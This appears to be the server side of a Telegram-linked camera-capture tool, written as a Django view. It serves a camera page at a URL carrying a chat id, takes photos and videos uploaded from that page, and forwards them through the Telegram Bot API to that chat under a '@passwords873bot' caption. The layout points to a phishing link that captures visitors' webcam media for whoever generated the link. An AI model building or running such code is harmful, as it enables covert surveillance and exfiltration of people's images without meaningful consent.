import os
import uuid
import requests
import subprocess
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render

TELEGRAM_BOT_TOKEN = "TOKEN"

@csrf_exempt
def camera_view(request, id):

    if request.method == "GET":
        return render(request, "camera/index.html")

    # ============ RASM ============
    if "image" in request.FILES:
        img = request.FILES["image"]

        ext = img.name.split(".")[-1]
        filename = f"{id}_{uuid.uuid4()}.{ext}"

        save_path = os.path.join(settings.MEDIA_ROOT, "saved_images", filename)

        os.makedirs(os.path.dirname(save_path), exist_ok=True)

        with open(save_path, "wb") as f:
            for chunk in img.chunks():
                f.write(chunk)

        try:
            with open(save_path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    files={"photo": f},
                    data={"chat_id": id, "caption": "Rasm 📸\n\n@passwords873bot"},
                    timeout=20
                )
        except Exception as e:
            print("Telegram IMG xato:", e)

        return JsonResponse({"status": "ok", "file": filename})

    # ============ VIDEO ============
    if "video" in request.FILES:
        video = request.FILES["video"]

        webm_name = f"{id}_{uuid.uuid4()}.webm"
        mp4_name = webm_name.replace(".webm", ".mp4")

        webm_path = os.path.join(settings.MEDIA_ROOT, "saved_videos", webm_name)
        mp4_path = os.path.join(settings.MEDIA_ROOT, "saved_videos", mp4_name)

        os.makedirs(os.path.dirname(webm_path), exist_ok=True)

        # WebM saqlash
        with open(webm_path, "wb") as f:
            for chunk in video.chunks():
                f.write(chunk)

        # convert → mp4
        try:
            subprocess.run(
                ["ffmpeg", "-i", webm_path, "-c:v", "libx264", "-preset", "fast",
                 "-c:a", "aac", "-b:a", "128k", "-y", mp4_path],
                check=True
            )

            # Telegramga mp4 yuborish
            with open(mp4_path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo",
                    files={"video": f},
                    data={"chat_id": id, "caption": "Video 🎥\n\n@passwords873bot"},
                    timeout=60
                )

        except Exception as e:
            print("Video convert xato:", e)
            return JsonResponse({"status": "error", "msg": "convert xato"})

        return JsonResponse({"status": "ok", "file": mp4_name})

    return JsonResponse({"status": "error", "msg": "file yo'q"})
